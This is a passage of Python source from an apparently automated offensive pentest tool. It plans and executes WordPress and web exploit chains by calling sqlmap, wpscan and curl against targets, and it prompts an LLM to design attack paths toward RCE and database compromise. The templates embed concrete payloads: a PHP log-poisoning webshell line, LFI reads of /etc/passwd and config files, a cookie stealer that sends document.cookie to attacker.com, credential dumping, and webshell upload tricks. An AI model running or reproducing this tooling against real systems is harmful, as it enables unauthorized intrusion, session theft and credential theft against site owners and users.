                            tool="custom_script",
                            success_indicator="Valid users identified"
                        ),
                        ExploitStep(
                            name="Brute force passwords",
                            action="brute_force",
                            target=auth_eps[0].get('url'),
                            tool="hydra",
                            success_indicator="Credentials obtained"
                        ),
                        ExploitStep(
                            name="Login with compromised account",
                            action="authentication",
                            target=auth_eps[0].get('url'),
                            tool="curl",
                            success_indicator="Account compromised"
                        )
                    ],
                    risk_level="HIGH"
                ))
        
        # Pattern 6: Injection attacks (SQLi, Command, etc)
        injection_hints = [h for h in hint_inventory if 'injection' in h.lower() or 'sqli' in h.lower()]
        if injection_hints:
            hint = injection_hints[0]
            injection_eps = hint_inventory[hint]
            chains.append(self._build_pattern_chain(
                name=f"{hint.title()} Exploitation",
                description=f"Exploit {hint} vulnerability for database access or command execution",
                steps=[
                    ExploitStep(
                        name="Test vulnerability",
                        action="vulnerability_test",
                        target=injection_eps[0].get('url'),
                        tool="sqlmap" if 'sql' in hint else "curl",
                        success_indicator="Vulnerability confirmed"
                    ),
                    ExploitStep(
                        name="Extract data or execute commands",
                        action="data_extraction",
                        target=injection_eps[0].get('url'),
                        tool="sqlmap" if 'sql' in hint else "curl",
                        success_indicator="Sensitive data obtained"
                    )
                ],
                risk_level="HIGH" if 'sql' in hint else "MEDIUM"
            ))
        
        return chains

    def _build_pattern_chain(
        self,
        name: str,
        description: str,
        steps: List[ExploitStep],
        risk_level: str = "MEDIUM"
    ) -> ExploitChain:
        """Build an exploit chain from pattern components."""
        return ExploitChain(
            name=name,
            description=description,
            steps=steps,
            risk_level=risk_level,
            estimated_time=f"{len(steps) * 10}-{len(steps) * 30} min",
            prerequisites=["target reachable", "network access to target"]
        )


class AIPoweredChainPlanner:
    """
    AI-powered chain planning bổ sung bên cạnh ChainPlanner cũ.
    Không thay thế graph-based planner hiện tại, chỉ enrich thêm chains.
    """

    def __init__(self, groq_client=None):
        self.groq = groq_client
        self._ai_call_count = 0

    def plan_chains(self, state: Dict) -> List[Dict]:
        """Build additional chains from state without depending on the old planner API."""
        vulnerabilities = state.get("vulnerabilities", []) or []
        wp_plugins = state.get("wp_plugins", []) or []
        wp_themes = state.get("wp_themes", []) or []
        wp_core = state.get("wp_core", {}) or {}
        tech_stack = state.get("tech_stack", []) or []
        users = state.get("wp_users", []) or []
        wordpress_detected = bool(state.get("wordpress_detected", False))

        cves = self._collect_cves(wp_plugins, wp_themes, wp_core)
        rule_chains = self._rule_based_chains(
            wordpress_detected=wordpress_detected,
            plugins=wp_plugins,
            themes=wp_themes,
            core=wp_core,
            users=users,
            vulns=vulnerabilities,
        )

        ai_chains: List[Dict] = []
        if self.groq and (cves or vulnerabilities):
            ai_chains = self._ai_chains(
                {
                    "target": state.get("target"),
                    "tech_stack": tech_stack,
                    "wordpress": {
                        "detected": wordpress_detected,
                        "version": wp_core.get("version") or state.get("wp_version"),
                        "plugins": wp_plugins,
                        "themes": wp_themes,
                        "users": users,
                    },
                    "vulnerabilities": vulnerabilities[:10],
                    "cves": cves[:10],
                    "endpoints": state.get("prioritized_endpoints", [])[:10],
                }
            )

        return self._merge_and_rank(rule_chains + ai_chains)

    def _collect_cves(self, plugins: List[Dict], themes: List[Dict], core: Dict) -> List[Dict]:
        cves: List[Dict] = []
        for plugin in plugins:
            for vuln in plugin.get("vulnerabilities", []) or []:
                if vuln.get("cve"):
                    cves.append(vuln)
        for theme in themes:
            for vuln in theme.get("vulnerabilities", []) or []:
                if vuln.get("cve"):
                    cves.append(vuln)
        for vuln in core.get("vulnerabilities", []) or []:
            if vuln.get("cve"):
                cves.append(vuln)
        return cves

    def _rule_based_chains(
        self,
        wordpress_detected: bool,
        plugins: List[Dict],
        themes: List[Dict],
        core: Dict,
        users: List[str],
        vulns: List[Dict],
    ) -> List[Dict]:
        chains: List[Dict] = []

        if wordpress_detected:
            for plugin in plugins:
                plugin_vulns = plugin.get("vulnerabilities", []) or []
                if plugin_vulns:
                    first_vuln = plugin_vulns[0]
                    chains.append(
                        {
                            "name": f"Exploit {plugin.get('name', 'plugin')} CVE -> RCE",
                            "severity": "CRITICAL",
                            "steps": [
                                {"action": "verify_plugin_version", "target": plugin.get("name", "")},
                                {"action": "exploit_cve", "cve": first_vuln.get("cve", "Unknown")},
                                {"action": "get_shell"},
                            ],
                            "confidence": 0.8,
                            "reasoning": f"Detected plugin {plugin.get('name')} with known CVE-backed issues.",
                        }
                    )

            if core.get("vulnerabilities"):
                first_vuln = core["vulnerabilities"][0]
                chains.append(
                    {
                        "name": "Exploit WordPress Core CVE",
                        "severity": "HIGH",
                        "steps": [
                            {"action": "verify_core_version", "target": core.get("version", "")},
                            {"action": "exploit_cve", "cve": first_vuln.get("cve", "Unknown")},
                        ],
                        "confidence": 0.7,
                        "reasoning": "Detected WordPress core version with known vulnerabilities.",
                    }
                )

            if users:
                chains.append(
                    {
                        "name": "WordPress Admin Takeover -> RCE",
                        "severity": "CRITICAL",
                        "steps": [
                            {"action": "enum_users"},
                            {"action": "bruteforce_password"},
                            {"action": "upload_shell"},
                        ],
                        "confidence": 0.6,
                        "reasoning": f"Found {len(users)} enumerated users and WordPress attack surface.",
                    }
                )

        if any("xmlrpc" in (v.get("type", "") or "").lower() for v in vulns):
            chains.append(
                {
                    "name": "XML-RPC Multicall Bruteforce",
                    "severity": "HIGH",
                    "steps": [
                        {"action": "verify_xmlrpc"},
                        {"action": "bruteforce_users"},
                    ],
                    "confidence": 0.7,
                    "reasoning": "XML-RPC related behavior detected in vulnerabilities.",
                }
            )

        for theme in themes:
            theme_vulns = theme.get("vulnerabilities", []) or []
            if theme_vulns:
                first_vuln = theme_vulns[0]
                chains.append(
                    {
                        "name": f"Exploit theme {theme.get('name', 'theme')} vulnerability",
                        "severity": "HIGH",
                        "steps": [
                            {"action": "verify_theme_version", "target": theme.get("name", "")},
                            {"action": "exploit_cve", "cve": first_vuln.get("cve", "Unknown")},
                        ],
                        "confidence": 0.65,
                        "reasoning": "Detected theme with associated vulnerabilities.",
                    }
                )

        return chains

    def _ai_chains(self, context: Dict[str, Any]) -> List[Dict]:
        if self._ai_call_count >= 2:
            return []
        self._ai_call_count += 1

        prompt = f"""
Phan tich context sau va de xuat chuoi tan cong hop ly.

Target: {context.get('target')}
Tech Stack: {', '.join(context.get('tech_stack', []))}
WordPress detected: {context.get('wordpress', {}).get('detected')}
WordPress version: {context.get('wordpress', {}).get('version')}
Plugins detected: {len(context.get('wordpress', {}).get('plugins', []))}
Themes detected: {len(context.get('wordpress', {}).get('themes', []))}
Users detected: {len(context.get('wordpress', {}).get('users', []))}

CVEs:
{json.dumps(context.get('cves', []), indent=2, default=str)}

Vulnerabilities:
{json.dumps(context.get('vulnerabilities', []), indent=2, default=str)}

Return ONLY a JSON list. Each item must contain:
- name
- severity
- steps
- confidence
- reasoning
"""
        try:
            response = self.groq.generate(prompt)
            match = re.search(r"\[[\s\S]*\]", response)
            if not match:
                return []
            parsed = json.loads(match.group(0))
            return [item for item in parsed if isinstance(item, dict)]
        except Exception as e:
            logger.error(f"[AI-CHAIN] Failed: {e}")
            return []

    def _merge_and_rank(self, chains: List[Dict]) -> List[Dict]:
        def rank(chain: Dict) -> float:
            severity_score = {"CRITICAL": 100, "HIGH": 70, "MEDIUM": 40, "LOW": 10}.get(
                str(chain.get("severity", "MEDIUM")).upper(),
                0,
            )
            confidence_score = float(chain.get("confidence", 0) or 0) * 50
            return severity_score + confidence_score

        unique: List[Dict] = []
        seen = set()
        for chain in chains:
            name = chain.get("name", "")
            if not name or name in seen:
                continue
            seen.add(name)
            unique.append(chain)

        unique.sort(key=rank, reverse=True)
        return unique

    def _generate_chains_with_ai(self, attack_context: Dict) -> List[ExploitChain]:
        """
        Generate exploitation chains using AI/Groq analysis.
        Focuses on realistic multi-step attack paths.
        """
        try:
            # Build prompt with attack context
            context_str = json.dumps({
                'target': attack_context.get('target', ''),
                'endpoints': [(e.get('url', ''), e.get('endpoint_type', '')) for e in attack_context.get('endpoints', [])[:10]],
                'vulnerability_hints': list(attack_context.get('vulnerability_hints', [])[:10]),
                'technologies': attack_context.get('technologies', []),
                'chain_patterns': [p.get('name', '') for p in attack_context.get('chain_patterns', [])],
            }, indent=2)

            prompt = f"""Analyze this target infrastructure and design exploitation chains:

{context_str}

Generate 3-5 realistic attack chains that could lead to:
- RCE (Remote Code Execution)
- Admin access
- Database compromise
- Sensitive data exposure

Format each chain as JSON with:
- entry_point: Starting endpoint
- steps: Array of attack steps (in order)
- technique: Main technique used
- expected_impact: What attacker gains"""

            response = self.groq.generate(
                prompt=prompt,
                system=_CHAIN_PLANNER_SYSTEM,
                temperature=0.3
            )

            # Parse and convert AI response to ExploitChain objects
            chains = self._parse_ai_chains_response(response)
            logger.info(f"[CHAIN] AI generated {len(chains)} chains")
            return chains
        except Exception as e:
            logger.debug(f"[CHAIN] AI chain generation error: {e}")
            return []

    def _parse_ai_chains_response(self, response: str) -> List[ExploitChain]:
        """Parse AI-generated chains from response text."""
        chains = []
        try:
            # Try to extract JSON from response
            json_matches = re.findall(r'\{[^{}]*"entry_point"[^{}]*\}', response, re.DOTALL)
            
            for match in json_matches:
                try:
                    chain_data = json.loads(match)
                    
                    # Build steps
                    steps = []
                    for step_text in chain_data.get('steps', []):
                        steps.append(ExploitStep(
                            name=step_text,
                            action=step_text,
                            target="target",
                            success_indicator="success"
                        ))
                    
                    # Build chain
                    chain = ExploitChain(
                        name=chain_data.get('technique', 'ai_generated_chain'),
                        description=chain_data.get('expected_impact', ''),
                        steps=steps,
                        risk_level="HIGH",
                        prerequisites=[chain_data.get('entry_point', '')],
                        postconditions=[chain_data.get('expected_impact', '')]
                    )
                    chains.append(chain)
                except (json.JSONDecodeError, KeyError):
                    continue
        except Exception as e:
            logger.debug(f"[CHAIN] Failed to parse AI response: {e}")
        
        return chains

    def smart_prioritize(self, chains: List[ExploitChain]) -> List[ExploitChain]:
        """AI-like prioritization based on impact, feasibility, and state data"""
        for chain in chains:
            score = 0

            # Impact score based on postconditions
            impact_score = self._calculate_impact_score(chain.postconditions)
            score += impact_score * 2  # Weight impact heavily

            # Likelihood score based on prerequisites and state
            likelihood_score = self._calculate_likelihood_score(chain.prerequisites, chain.preconditions)
            score += likelihood_score

            # Complexity penalty: more steps = harder
            complexity_penalty = len(chain.steps) * 5
            score -= complexity_penalty

            # Risk level bonus
            risk_scores = {"CRITICAL": 50, "HIGH": 30, "MEDIUM": 15, "LOW": 5}
            score += risk_scores.get(chain.risk_level, 0)

            # Target availability bonus
            targets = {s.target for s in chain.steps}
            available_targets = set()
            live_hosts = self.state.get("live_hosts", [])
            for host in live_hosts:
                available_targets.add(host.get("url", ""))
            score += len(targets & available_targets) * 10

            # Vuln confirmation bonus
            vulns = self.state.get("vulnerabilities", [])
            vuln_types = {v.get("name", "").lower() for v in vulns}
            if any(vt in chain.name.lower() for vt in vuln_types):
                score += 20

            chain.priority_score = score

            # === ADAPTIVE LEARNING PATCH ===
            if self.learning_engine:
                learning_data = self.learning_engine.export_learning_data()

                failed = learning_data.get("failed_payloads", [])
                success = learning_data.get("successful_payloads", [])

                # nếu chain liên quan payload fail nhiều → giảm điểm
                for f in failed[-50:]:
                    if f.get("vuln_type") and f.get("vuln_type").lower() in chain.name.lower():
                        score -= 5

                # nếu chain từng thành công → boost mạnh
                for s in success:
                    if s.get("vuln_type") and s.get("vuln_type").lower() in chain.name.lower():
                        score += 10

        return sorted(chains, key=lambda c: getattr(c, 'priority_score', 0), reverse=True)

    def _build_conditioned_wp_chains(self) -> List[ExploitChain]:
        """
        Build chains from CVE-conditioned WP findings.
        Only include high-confidence candidates.
        """
        out: List[ExploitChain] = []
        conditioned = self.state.get("wp_conditioned_findings", []) or []
        target = self.state.get("target", "")
        for item in conditioned:
            if not item.get("chain_candidate"):
                continue
            name = item.get("name", "component")
            cves = item.get("cve", []) or []
            cve_txt = ", ".join(cves[:3]) if cves else "known CVE"
            vuln_type = item.get("vuln_type", "unknown")
            auth_req = ((item.get("conditions", {}) or {}).get("auth_requirement", "unknown"))
            endpoint = ((item.get("conditions", {}) or {}).get("candidate_endpoint", target))
            confidence = int(item.get("confidence", 0) or 0)

            chain = ExploitChain(
                name=f"WP Conditioned Chain: {name}",
                description=f"Version-matched {vuln_type} candidate ({cve_txt}) on {name}",
                risk_level=item.get("severity", "HIGH"),
                estimated_time="15-45 min",
                prerequisites=[f"Component present: {name}", f"Auth requirement: {auth_req}"],
                preconditions=["manual authorization confirmed", "proxy logging enabled"],
                postconditions=["manual_verification_decision"],
                steps=[
                    ExploitStep(
                        name="Version Confirmation",
                        action="confirm_component_version",
                        target=endpoint,
                        tool="browser+proxy",
                        success_indicator="version evidence captured",
                        priority=10,
                    ),
                    ExploitStep(
                        name="Condition Check",
                        action="validate_exploit_preconditions",
                        target=endpoint,
                        tool="manual",
                        success_indicator=f"preconditions for {cve_txt} satisfied",
                        priority=9,
                    ),
                    ExploitStep(
                        name="Controlled PoC Replay",
                        action="replay_non_destructive_poc",
                        target=endpoint,
                        tool="repeater",
                        success_indicator="behavioral indicator reproduced safely",
                        priority=8,
                    ),
                    ExploitStep(
                        name="Evidence & Triage",
                        action="document_confirm_or_reject",
                        target=endpoint,
                        tool="reporting",
                        success_indicator="finding marked confirmed/rejected with evidence",
                        priority=7,
                    ),
                ],
            )
            chain.priority_score = max(getattr(chain, "priority_score", 0), confidence + 40)
            out.append(chain)
        return out

    def _calculate_impact_score(self, postconditions: List[str]) -> int:
        """Calculate impact score based on postconditions"""
        impact_map = {
            "code_execution": 100,
            "remote_shell": 100,
            "privilege_escalation": 90,
            "data_exfiltration": 80,
            "file_write": 70,
            "admin_access": 60,
            "user_account_compromise": 50,
            "information_disclosure": 30,
            "denial_of_service": 20
        }
        return max([impact_map.get(pc, 0) for pc in postconditions], default=0)

    def _calculate_likelihood_score(self, prerequisites: List[str], preconditions: List[str]) -> int:
        """Calculate likelihood score based on prerequisites and preconditions"""
        score = 50  # Base score

        # Check prerequisites
        for prereq in prerequisites + preconditions:
            if "WordPress" in prereq and self.state.get("wordpress_detected"):
                score += 20
            elif "SQLi" in prereq:
                vulns = self.state.get("vulnerabilities", [])
                if any("sql" in v.get("name", "").lower() for v in vulns):
                    score += 15
            elif "authenticated" in prereq:
                # Assume if we have session or login vulns, higher likelihood
                vulns = self.state.get("vulnerabilities", [])
                if any("auth" in v.get("name", "").lower() or "login" in v.get("name", "").lower() for v in vulns):
                    score += 10
            elif "file_upload" in prereq:
                endpoints = self.state.get("prioritized_endpoints", [])
                if any("upload" in ep.get("categories", []) for ep in endpoints):
                    score += 15

        return score

    def execute_chain(self, chain: ExploitChain) -> Dict[str, any]:
        """Execute an exploit chain step by step, respecting dependencies"""
        logger.info(f"[EXEC] Starting chain: {chain.name}")
        results = {"chain": chain.name, "steps_executed": [], "success": False, "final_payload": None}

        # Check prerequisites
        if not self._check_prerequisites(chain.prerequisites):
            logger.warning(f"[EXEC] Prerequisites not met for {chain.name}")
            return results

        executed_steps = set()
        for step in sorted(chain.steps, key=lambda s: s.priority, reverse=True):
            # Check dependencies
            if step.depends_on and not all(dep in executed_steps for dep in step.depends_on):
                logger.info(f"[EXEC] Skipping {step.name} - dependencies not met")
                continue

            logger.info(f"[EXEC] Executing step: {step.name}")
            step_result = self._execute_step(step)
            results["steps_executed"].append({"step": step.name, "result": step_result})

            if step_result.get("success"):
                executed_steps.add(step.name)
                if step.name == chain.steps[-1].name:  # Last step
                    results["success"] = True
                    results["final_payload"] = step_result.get("output")
            else:
                logger.warning(f"[EXEC] Step {step.name} failed, aborting chain")
                break

        return results

    def _check_prerequisites(self, prereqs: List[str]) -> bool:
        """Check if prerequisites are met based on state"""
        for prereq in prereqs:
            if "WordPress" in prereq:
                if not self.state.get("wordpress_detected"):
                    return False
            elif "SQLi" in prereq:
                vulns = self.state.get("vulnerabilities", [])
                if not any("sql" in v.get("name", "").lower() for v in vulns):
                    return False
            # Add more checks as needed
        return True

    def _execute_step(self, step: ExploitStep) -> Dict[str, any]:
        """Execute a single step using appropriate tool"""
        result = {"success": False, "output": "", "error": ""}
        raw_tool = (step.tool or "").strip().lower()
        tool_alias = {
            "wpscan/hydra": "wpscan",
            "curl/browser": "curl",
            "browser/curl": "curl",
            "nc/python": "curl",
            "custom_script": "curl",
        }
        tool = tool_alias.get(raw_tool, raw_tool.split("/", 1)[0] if "/" in raw_tool else raw_tool)

        try:
            if tool == "sqlmap":
                cmd = ["sqlmap", "-u", step.target, "--batch", "--level=5", "--risk=3"]
                if step.payload:
                    cmd.extend(step.payload.split())
                ret, out, err = run_command(cmd, timeout=600)
                result["success"] = ret == 0 and step.success_indicator in out
                result["output"] = out
                result["error"] = err

            elif tool == "curl":
                cmd = ["curl", "-s", step.target]
                if step.payload:
                    cmd.extend(["-d", step.payload])
                ret, out, err = run_command(cmd, timeout=60)
                result["success"] = step.success_indicator in out if step.success_indicator else ret == 0
                result["output"] = out
                result["error"] = err

            elif tool == "wpscan":
                cmd = ["wpscan", "--url", step.target, "--enumerate", "u"]
                if step.payload:
                    cmd.extend(step.payload.split())
                ret, out, err = run_command(cmd, timeout=300)
                result["success"] = step.success_indicator in out if step.success_indicator else ret == 0
                result["output"] = out
                result["error"] = err

            # Add more tool executions as needed
            else:
                logger.warning(f"[EXEC] Tool {step.tool} not implemented yet")
                result["error"] = f"Tool {step.tool} not supported"

        except Exception as e:
            result["error"] = str(e)

        return result

    def _build_wp_admin_chain(self, users: List[str]) -> ExploitChain:
        """WordPress: enumerate → brute → wp-admin → plugin upload → RCE"""
        primary_user = users[0] if users else "admin"

        return ExploitChain(
            name="WordPress Admin Takeover → RCE",
            description="Bruteforce WP credentials, log in as admin, upload malicious plugin for RCE",
            risk_level="CRITICAL",
            estimated_time="15-60 min",
            prerequisites=["WordPress detected", "Login page accessible"],
            preconditions=["wp_users_enumerated"],
            postconditions=["code_execution", "remote_shell", "admin_access"],
            steps=[
                ExploitStep(
                    name="User Enumeration",
                    action="enumerate_wp_users",
                    target=self._build_full_url("wp-json/wp/v2/users"),
                    tool="curl",
                    success_indicator="user list extracted",
                    priority=10,
                ),
                ExploitStep(
                    name="Password Bruteforce",
                    action="bruteforce_wp_login",
                    target=self._build_full_url("wp-login.php"),
                    tool="wpscan/hydra",
                    payload=f"username={primary_user}",
                    depends_on=["User Enumeration"],
                    success_indicator="valid credentials found",
                    priority=9,
                ),
                ExploitStep(
                    name="Admin Login",
                    action="login_wp_admin",
                    target=self._build_full_url("wp-admin/"),
                    tool="curl/browser",
                    depends_on=["Password Bruteforce"],
                    success_indicator="admin dashboard accessible",
                    priority=8,
                ),
                ExploitStep(
                    name="Plugin Upload",
                    action="upload_malicious_plugin",
                    target=self._build_full_url("wp-admin/plugin-install.php"),
                    tool="curl",
                    payload="malicious_plugin.zip",
                    depends_on=["Admin Login"],
                    success_indicator="plugin activated",
                    priority=7,
                ),
                ExploitStep(
                    name="Reverse Shell",
                    action="trigger_reverse_shell",
                    target=self._build_full_url("wp-content/plugins/malicious/shell.php"),
                    tool="nc",
                    payload="cmd=id",
                    depends_on=["Plugin Upload"],
                    success_indicator="shell connection established",
                    priority=6,
                    postconditions=["remote_shell"]
                ),
            ]
        )

    def _build_xmlrpc_chain(self, users: List[str]) -> ExploitChain:
        """XML-RPC multicall bruteforce"""
        return ExploitChain(
            name="XML-RPC Multicall Bruteforce",
            description="Abuse XML-RPC system.multicall to test many passwords at once",
            risk_level="HIGH",
            estimated_time="5-20 min",
            prerequisites=["xmlrpc.php accessible"],
            steps=[
                ExploitStep(
                    name="Verify XML-RPC",
                    action="check_xmlrpc",
                    target=self._build_full_url("xmlrpc.php"),
                    tool="curl",
                    payload="system.listMethods",
                    success_indicator="methodResponse received",
                    priority=10,
                ),
                ExploitStep(
                    name="Multicall Bruteforce",
                    action="xmlrpc_multicall",
                    target=self._build_full_url("xmlrpc.php"),
                    tool="custom_script",
                    payload="wp.getUsersBlogs multicall",
                    depends_on=["Verify XML-RPC"],
                    success_indicator="valid credentials in response",
                    priority=9,
                ),
            ]
        )

    def _build_sqli_chain(self, vuln: Dict) -> ExploitChain:
        """SQL injection → data exfil → possible auth bypass"""
        vuln_url = vuln.get("url", "")
        if not vuln_url.startswith(('http://', 'https://')):
            vuln_url = self._build_full_url(vuln_url)
        
        return ExploitChain(
            name="SQL Injection → Data Exfiltration",
            description="Exploit SQLi to dump credentials and sensitive data",
            risk_level="CRITICAL",
            estimated_time="10-30 min",
            prerequisites=["SQLi vulnerability found"],
            preconditions=[],
            postconditions=["data_exfiltration", "information_disclosure"],
            steps=[
                ExploitStep(
                    name="Confirm SQLi",
                    action="test_sqli",
                    target=vuln_url,
                    tool="sqlmap",
                    payload="' OR '1'='1",
                    success_indicator="SQL error or boolean difference detected",
                    priority=10,
                ),
                ExploitStep(
                    name="Database Enumeration",
                    action="enumerate_databases",
                    target=vuln_url,
                    tool="sqlmap",
                    payload="--dbs",
                    depends_on=["Confirm SQLi"],
                    success_indicator="database list extracted",
                    priority=9,
                ),
                ExploitStep(
                    name="Dump Credentials",
                    action="dump_users_table",
                    target=vuln_url,
                    tool="sqlmap",
                    payload="--dump -T users",
                    depends_on=["Database Enumeration"],
                    success_indicator="credentials dumped",
                    priority=8,
                ),
                ExploitStep(
                    name="Auth Bypass",
                    action="try_extracted_credentials",
                    target=self._build_full_url("login"),
                    tool="curl",
                    depends_on=["Dump Credentials"],
                    success_indicator="authenticated successfully",
                    priority=7,
                    postconditions=["admin_access"]
                ),
            ]
        )

    def _build_upload_chain(self, endpoint: Dict) -> ExploitChain:
        """File upload → webshell → RCE"""
        upload_url = endpoint.get("url", "")
        if not upload_url.startswith(('http://', 'https://')):
            upload_url = self._build_full_url(upload_url)
        
        return ExploitChain(
            name="File Upload → Webshell → RCE",
            description="Bypass file upload restrictions to deploy a webshell",
            risk_level="CRITICAL",
            estimated_time="5-20 min",
            prerequisites=["File upload endpoint found"],
            steps=[
                ExploitStep(
                    name="Test Upload",
                    action="upload_benign_file",
                    target=upload_url,
                    tool="curl",
                    payload="test.txt",
                    success_indicator="upload successful",
                    priority=10,
                ),
                ExploitStep(
                    name="Bypass Extension Filter",
                    action="upload_php_double_ext",
                    target=upload_url,
                    tool="curl",
                    payload="shell.php.jpg",
                    depends_on=["Test Upload"],
                    success_indicator="file accepted",
                    priority=9,
                ),
                ExploitStep(
                    name="Execute Webshell",
                    action="trigger_webshell",
                    target=self._build_full_url("uploads/shell.php"),
                    tool="curl",
                    payload="?cmd=id",
                    depends_on=["Bypass Extension Filter"],
                    success_indicator="command output received",
                    priority=8,
                ),
            ]
        )

    def _build_lfi_chain(self, endpoint: Dict) -> ExploitChain:
        """LFI → log poisoning → RCE"""
        endpoint_url = endpoint.get("url", "")
        if not endpoint_url.startswith(('http://', 'https://')):
            endpoint_url = self._build_full_url(endpoint_url)
        
        return ExploitChain(
            name="LFI → Log Poisoning → RCE",
            description="Exploit LFI to read sensitive files, then poison logs for RCE",
            risk_level="HIGH",
            estimated_time="15-45 min",
            prerequisites=["LFI parameter found"],
            steps=[
                ExploitStep(
                    name="Confirm LFI",
                    action="test_lfi",
                    target=endpoint_url,
                    payload="../../../../etc/passwd",
                    success_indicator="passwd file content in response",
                    priority=10,
                ),
                ExploitStep(
                    name="Read Config Files",
                    action="read_config",
                    target=endpoint_url,
                    payload="../../../../var/www/html/config.php",
                    depends_on=["Confirm LFI"],
                    success_indicator="database credentials found",
                    priority=9,
                ),
                ExploitStep(
                    name="Log Poisoning",
                    action="inject_php_in_logs",
                    target=self._get_base_url(),
                    payload="<?php system($_GET['cmd']); ?>",
                    depends_on=["Confirm LFI"],
                    success_indicator="PHP code in logs",
                    priority=8,
                ),
                ExploitStep(
                    name="Execute via LFI",
                    action="include_poisoned_log",
                    target=endpoint_url,
                    payload="../../../../var/log/apache2/access.log&cmd=id",
                    depends_on=["Log Poisoning"],
                    success_indicator="RCE achieved",
                    priority=7,
                ),
            ]
        )

    def _build_xss_chain(self, vuln: Dict) -> ExploitChain:
        """XSS → session hijack → account takeover"""
        vuln_url = vuln.get("url", "")
        if not vuln_url.startswith(('http://', 'https://')):
            vuln_url = self._build_full_url(vuln_url)
        
        admin_url = self._build_full_url("admin")
        
        return ExploitChain(
            name="XSS → Session Hijack → Account Takeover",
            description="Use stored/reflected XSS to steal admin session cookies",
            risk_level="HIGH",
            estimated_time="30-120 min",
            prerequisites=["XSS vulnerability found"],
            steps=[
                ExploitStep(
                    name="Confirm XSS",
                    action="test_xss",
                    target=vuln_url,
                    payload="<script>alert(1)</script>",
                    success_indicator="alert triggered",
                    priority=10,
                ),
                ExploitStep(
                    name="Setup Cookie Collector",
                    action="start_listener",
                    target="http://127.0.0.1:8000",
                    tool="nc/python",
                    success_indicator="server listening",
                    priority=9,
                ),
                ExploitStep(
                    name="Inject Cookie Stealer",
                    action="inject_cookie_stealer",
                    target=vuln_url,
                    payload="<script>document.location='http://attacker.com/?c='+document.cookie</script>",
                    depends_on=["Setup Cookie Collector"],
                    success_indicator="admin visits page",
                    priority=8,
                ),
                ExploitStep(
                    name="Session Replay",
                    action="use_stolen_session",
                    target=admin_url,
                    tool="browser/curl",
                    depends_on=["Inject Cookie Stealer"],
                    success_indicator="admin access achieved",
                    priority=7,
                ),
            ]
        )

    def _build_wp_plugin_chain(self, plugin: Dict) -> ExploitChain:
        """Exploit vulnerable WordPress plugin"""
        plugin_name = plugin.get("name", "unknown")
        vulns = plugin.get("vulnerabilities", [])
        vuln_type = vulns[0].get("type", "unknown") if vulns else "unknown"

        return ExploitChain(
            name=f"WordPress Plugin Exploit: {plugin_name}",
            description=f"Exploit {vuln_type} vulnerability in plugin {plugin_name}",
            risk_level="CRITICAL" if "RCE" in vuln_type else "HIGH",
            estimated_time="5-15 min",
            prerequisites=[f"Plugin {plugin_name} installed and active"],
            steps=[
                ExploitStep(
                    name="Confirm Plugin Version",
                    action="check_plugin_version",
                    target=self._build_full_url(f"wp-content/plugins/{plugin_name}/readme.txt"),
                    success_indicator="vulnerable version confirmed",
                    priority=10,
                ),
                ExploitStep(
                    name="Send Exploit Payload",
                    action="exploit_plugin_vuln",
                    target=self._build_full_url(f"wp-content/plugins/{plugin_name}/"),
                    tool="curl/metasploit",
                    payload=f"{vuln_type} payload",
                    depends_on=["Confirm Plugin Version"],
                    success_indicator="exploit successful",
                    priority=9,
                ),
            ]
        )

    def combine_chains(self, chains: List[ExploitChain]) -> List[ExploitChain]:
        """Intelligently combine overlapping chains for higher impact"""
        combined = []
        used = set()

        for i, chain1 in enumerate(chains):
            if i in used:
                continue
            combined_chain = chain1
            for j, chain2 in enumerate(chains):
                if j <= i or j in used:
                    continue
                if self._chains_overlap(chain1, chain2):
                    combined_chain = self._merge_chains(chain1, chain2)
                    used.add(j)
            combined.append(combined_chain)
            used.add(i)

        logger.info(f"[CHAIN] Combined into {len(combined)} chains")
        return combined

    def _chains_overlap(self, c1: ExploitChain, c2: ExploitChain) -> bool:
        """Check if two chains share common targets or vulns"""
        c1_targets = {s.target for s in c1.steps}
        c2_targets = {s.target for s in c2.steps}
        return bool(c1_targets & c2_targets) or c1.name.split("→")[0] == c2.name.split("→")[0]

    def _merge_chains(self, c1: ExploitChain, c2: ExploitChain) -> ExploitChain:
        """Merge two chains into one with combined steps"""
        merged_steps = c1.steps + [s for s in c2.steps if s not in c1.steps]
        return ExploitChain(
            name=f"{c1.name} + {c2.name}",
            description=f"Combined: {c1.description} + {c2.description}",
            risk_level="CRITICAL" if "CRITICAL" in [c1.risk_level, c2.risk_level] else "HIGH",
            estimated_time=f"{c1.estimated_time} + {c2.estimated_time}",
            prerequisites=list(set(c1.prerequisites + c2.prerequisites)),
            steps=merged_steps
        )

    def _detect_chain_patterns(self) -> List[ExploitChain]:
        """Detect exploit chain patterns from endpoints and vulns"""
        chains = []
        endpoints = self.state.get("prioritized_endpoints", [])
        vulns = self.state.get("vulnerabilities", [])

        # Pattern: Upload + Admin = RCE
        upload_eps = [e for e in endpoints if "upload" in e.get("categories", [])]
        admin_eps = [e for e in endpoints if "admin" in e.get("categories", [])]
        if upload_eps and admin_eps:
            chains.append(self._build_upload_admin_chain(upload_eps[0], admin_eps[0]))

        # Pattern: Auth bypass + Admin access
        auth_vulns = [v for v in vulns if "auth" in v.get("name", "").lower() or "bypass" in v.get("name", "").lower()]
        if auth_vulns and admin_eps:
            chains.append(self._build_auth_bypass_chain(auth_vulns[0], admin_eps[0]))

        # Pattern: LFI + Log poisoning
        lfi_vulns = [v for v in vulns if "lfi" in v.get("name", "").lower()]
        if lfi_vulns:
            chains.append(self._build_lfi_log_poison_chain(lfi_vulns[0]))

        return chains

    def _build_upload_admin_chain(self, upload_ep: Dict, admin_ep: Dict) -> ExploitChain:
        upload_url = upload_ep.get("url", "")
        if not upload_url.startswith(('http://', 'https://')):
            upload_url = self._build_full_url(upload_url)
        
        admin_url = admin_ep.get("url", "")
        if not admin_url.startswith(('http://', 'https://')):
            admin_url = self._build_full_url(admin_url)
        
        return ExploitChain(
            name="Upload → Admin Access → RCE",
            description="Upload malicious file, gain admin access, execute RCE",
            risk_level="CRITICAL",
            estimated_time="10-30 min",
            prerequisites=["Upload endpoint", "Admin panel"],
            steps=[
                ExploitStep(name="Upload Shell", action="upload_webshell", target=upload_url, tool="curl", payload="shell.php"),
                ExploitStep(name="Access Admin", action="login_admin", target=admin_url, tool="curl", depends_on=["Upload Shell"]),
                ExploitStep(name="Execute RCE", action="trigger_shell", target=self._build_full_url("uploaded_shell.php"), tool="curl", depends_on=["Access Admin"], payload="?cmd=id"),
            ]
        )

    def _build_auth_bypass_chain(self, vuln: Dict, admin_ep: Dict) -> ExploitChain:
        vuln_url = vuln.get("url", "")
        if not vuln_url.startswith(('http://', 'https://')):
